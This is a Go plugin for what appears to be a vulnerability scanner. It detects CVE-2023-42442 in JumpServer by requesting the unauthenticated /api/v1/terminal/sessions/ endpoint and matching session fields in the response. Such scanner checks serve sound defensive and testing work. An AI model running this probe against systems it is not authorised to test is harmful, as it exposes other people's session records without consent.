package goplugin

import (
	"Yscanner/utils"
	"net/http"
	"strings"
)

func init() {
	Register("jumpserver_cve_2023_42442", &jumpserver_cve_2023_42442{})
}

type jumpserver_cve_2023_42442 struct{}

func (p *jumpserver_cve_2023_42442) Info() PluginInfo {
	return PluginInfo{
		Name:     "JumpServer未授权访问漏洞（CVE-2023-42442）",
		VulnInfo: "JumpServer是开源堡垒主机，专业的运维安全审计系统。API接口/api/v1/terminal/sessions/权限控制被破坏，该API会话重放可以在没有身份验证的情况下下载。",
		VulnID:   "CVE-2023-42442",
		Level:    "9.8 CRITICAL",
		URL:      "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-42442",
		Version:  "v3.0.0 <= JumpServer <= v3.5.4; v3.6.0 <= JumpServer <= v3.6.3",
		CWE:      "CWE-287	认证机制不恰当",
	}
}

func (p *jumpserver_cve_2023_42442) Check(netloc string) bool {
	// req0, err := http.NewRequest("GET", netloc, nil)
	// if err != nil {
	// 	return false
	// }
	// resp0, err := utils.RequestDo(req0, true, 5)
	// if err != nil {
	// 	return false
	// }

	// if resp0.Other.StatusCode == 200 && strings.Contains(resp0.ResponseRaw, "Jumpserver") {
	// 	fmt.Println("[+] Connect to JumpServer")

	vulnURL := netloc + "/api/v1/terminal/sessions/"
	req, err := http.NewRequest("GET", vulnURL, nil)
	if err != nil {
		return false
	}
	resp, err := utils.RequestDo(req, true, 5)
	if err != nil {
		return false
	}
	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, "id") &&
		strings.Contains(resp.ResponseRaw, "user") && strings.Contains(resp.ResponseRaw, "user_id") &&
		strings.Contains(resp.ResponseRaw, "asset_id") && strings.Contains(resp.ResponseRaw, "protocol") {
		return true
	}
	// }
	return false
}
